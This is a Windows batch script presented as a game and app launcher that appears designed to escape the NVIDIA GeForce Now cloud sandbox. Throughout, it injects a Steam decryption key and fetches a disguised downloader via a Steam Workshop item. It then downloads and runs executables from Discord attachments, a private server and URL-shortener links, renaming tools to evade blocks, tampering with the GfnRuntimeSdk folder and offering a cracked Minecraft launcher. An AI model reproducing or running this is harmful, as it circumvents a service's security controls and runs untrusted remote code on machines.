@shift /0
@echo off
color 3F
title ~EjC5Mi#ion~'s Game And App Launcher


SETLOCAL
CALL :setESC
:start
cd\
ECHO "InstallConfigStore"{"Software"{"Valve"{"steam"{"depots"{"382490"{"DecryptionKey" "862e956521df2d7593e26b0401a13c1b574d118abd47cf701962302eb5130451"}}}}}} > "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\config\config.vdf"
REM passing workshop_download_item directly will crash session
(echo workshop_download_item 382490 2286097686 && echo. && echo quit && echo.)|clip
ECHO %ESC%[42mInitializing Ejc5millions Game And App Launcher%ESC%[0m 
ECHO %ESC%[46mPush Control + V In Steamcmd And Wait%ESC%[0m
START "" "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\steamcmd.exe" +force_install_dir "C:/Program Files (x86)/Steam/steamapps/common/Steamworks Shared/_CommonRedist/" +login anonymous
:loop
IF EXIST "C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\steamapps\workshop\content\382490\2286097686\downloader.exe" GOTO :hello:
goto loop


:hello
cls
ECHO %ESC%[46mDownloading Ejc5millions Games And App Launcher!%ESC%[0m 
SET DL="C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\steamapps\workshop\content\382490\2286097686\downloader.exe"
B:
cd\
md GamesAndPrograms
cd GamesAndPrograms
%DL% -LJOk "https://cdn.discordapp.com/attachments/789457246189781054/790407979870453760/oneGFN.exe" >NUL 2>&1
SET EXT="B:\GamesAndPrograms\oneGFN.exe"
:main
color 3F
B:
cd\
cd "B:\GamesAndPrograms"
cls

ECHO ------------------------------------------------------------------------------------------ 
ECHO                GAMES                                                     Programs       
ECHO 1- Battle.net                                                           a- Desktop
ECHO 2- Epic Games (May be patched)                                          b- Firefox
ECHO 3- Minecraft (offical launcher)                                         c- Discord                          
ECHO 4- Crystal Launcher (Mc cracked)                                        d- Discord PTB           
ECHO 5- Windows Xp Pinball                                                   e- Wexond
ECHO 6- Among Us                                                             f- 7zip
ECHO 7- Roblox                                                               g- Obs Studio
ECHO 8- Game comming soon                                                    h- Usg
ECHO 9- Game comming soon                                                    i- Explorer++
ECHO 10- Game comming soon                                                   j- Process Hacker
ECHO ------------------------------------------------------------------------------------------ 
ECHO                                        Other Program Launchers
ECHO                                      LT- LucidTools (By Zortos26)
ECHO                                     Arcade- Arcade (By Afonso1234)

ECHO Select 1, 2, 3, a, b, c, etc.
set/p input=

if %input%==1 goto BattleNet
if %input%==2 goto Epic
if %input%==3 goto mcraft
if %input%==4 goto crystalcraft
if %input%==5 goto Pinball
if %input%==6 goto AmongUs
if %input%==7 goto Roblox

if %input%==a goto Desktop
if %input%==b goto Firefox
if %input%==c goto Discord
if %input%==d goto DiscordPTB
if %input%==e goto Wexond
if %input%==f goto 7z
if %input%==g goto ObsStudio
if %input%==h goto Usg
if %input%==i goto explorer
if %input%==j goto process


if %input%==LT goto LucidTools
if %input%==Arcade goto Arcade

:crystalcraft
md CrystalMC
cd CrystalMC
%DL% -LJOk https://server.pwet.us/LT/Crystal-Launcher.zip
%EXT% xf Crystal-Launcher.zip
cd Crystal-Launcher
START "" "B:\GamesAndPrograms\CrystalMC\Crystal-launcher\launcher.exe"
goto :main


:Desktop
%DL% -LJOk https://cdn.discordapp.com/attachments/789457246189781054/790349470675107860/WinXShell.zip
%EXT% xf WinXShell.zip
cd WinXShell
start "" ""B:\GamesAndPrograms\WinXShell\start_1.bat"
goto :main  

:BattleNet
%DL% -LJOk https://server.pwet.us/LT/Battle.net.zip
%EXT% xf Battle.net.zip
del Battle.net.zip
cd "Battle.net"
start "" "B:\GamesAndPrograms\Battle.net\Battle.net.exe"
goto :main

:Epic
%DL% -LJOk https://server.pwet.us/LT/EG.zip
%EXT% xf EG.zip
cd "EG\Launcher\Engine\Binaries\Win64"
start "" lmaogames.exe
goto :main

:mcraft
%DL% -LJOk https://launcher.mojang.com/download/Minecraft.exe
start "" "B:\GamesAndPrograms\Minecraft.exe"
goto :main

:Roblox
md Roblox
cd Roblox
%DL% -LJOk https://cdn.discordapp.com/attachments/789457246189781054/790412810945429514/RobloxPlayerLauncher.exe"
start "" "B:\GamesAndPrograms\Roblox\RobloxPlayerLauncher.exe"
%DL% -LJOk https://server.pwet.us/LT/Firefox_1.zip
%EXT% xf Firefox_1.zip
set url="https://www.roblox.com/login"
cd Firefox
start vulpedefoc.exe %url%
goto :main




:Pinball
%DL% -LJOk https://cdn.discordapp.com/attachments/789457246189781054/790348257925922856/Pinball.zip
%EXT% -xf Pinball.zip
cd Pinball
start "" "B:\GamesAndPrograms\Pinball\Pinball.exe"
goto :main



:AmongUs
%DL% -LJOk https://server.pwet.us/LT/Among%20Us.zip
%EXT% -xf Among Us.zip
START "" "B:\GamesAndPrograms\Among Us\Among Us.exe"
goto :main





:Firefox
%DL% -LJOk https://server.pwet.us/LT/Firefox_1.zip
%EXT% xf Firefox_1.zip
cd Firefox
START "" "B:\GamesAndPrograms\Firefox\vulpedefoc.exe"
goto :main


:Discord
%DL% -LJOk "https://cdn.discordapp.com/attachments/789457246189781054/795520026157383720/DiscordSetup.exe"
START "" "B:\GamesAndPrograms\DiscordSetup.exe"
goto :main

:DiscordPTB
%DL% -LJOk "https://cdn.discordapp.com/attachments/789457246189781054/795520047027978290/DiscordPTBSetup.exe"
START "" "B:\GamesAndPrograms\DiscordPTBSetup.exe"
goto :main


:Wexond
%DL% -LJOk https://server.pwet.us/LT/Wexond.zip
%EXT% -xf Wexond.zip    
START "" "B:\GamesAndPrograms\Wexond\cloudforcebrowser.exe"
goto :main


:7z
%DL% -LJOk https://server.pwet.us/LT/8Zip.zip
%EXT% -xf 8zip.zip
START "" "B:\GamesAndPrograms\8Zip\8zFM.exe
goto :main

:ObsStudio
cd\
md LT
cd LT
%DL% -LJOk https://server.pwet.us/LT/OBSStudio.zip
%EXT% -xf OBSStudio.zip
START "" "B:\LT\OBSStudio\GNF.bat"
goto :main



:LucidTools
md B:\LT
B:
cd\
cd LT
%DL% -LJOk "server.pwet.us/LT.exe"
start "" "B:\LT\LT.exe"
goto :main



:Arcade
md B:\Arcade
cd\
cd Arcade
%DL% -LJOk "https://github.com/afonsosousah/afonsosousah.github.io/raw/master/Arcade.exe"
start "" "B:\Arcade\Arcade.exe"
goto :main

:Usg
START "" "C:\Program Files (x86)\Steam\_steam_installer\SteamSetup.exe"
tskill steam
cd\
:delfolder
REN "%LOCALAPPDATA%\NVIDIA Corporation\GfnRuntimeSdk" Usg >NUL 2>&1
IF EXIST "%LOCALAPPDATA%\NVIDIA Corporation\GfnRuntimeSdk" (GOTO :delfolder)
C:
cd\
cd Program Files (x86)
cd Steam
cd steamapps
cd shadercache
%DL% -LJOk "http://gg.gg/steamoldexe"
start steam.exe.old
B:
cd\
md Steam
cd Steam
%DL% -LJOk "http://gg.gg/steamexe"
TSKILL SteamSetup
START "" "B:\Steam\steam.exe"
goto :main


:explorer
%DL% -LJOk "https://server.pwet.us/LT/xplorer.exe"
start "" "B:\GamesAndPrograms\xplorer.exe
goto :main




:process
%DL% -LJOk "https://server.pwet.us/LT/xhack.exe"
start "" "B:\GamesAndPrograms\xhack.exe"
goto :main


:setESC
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)
GOTO :start
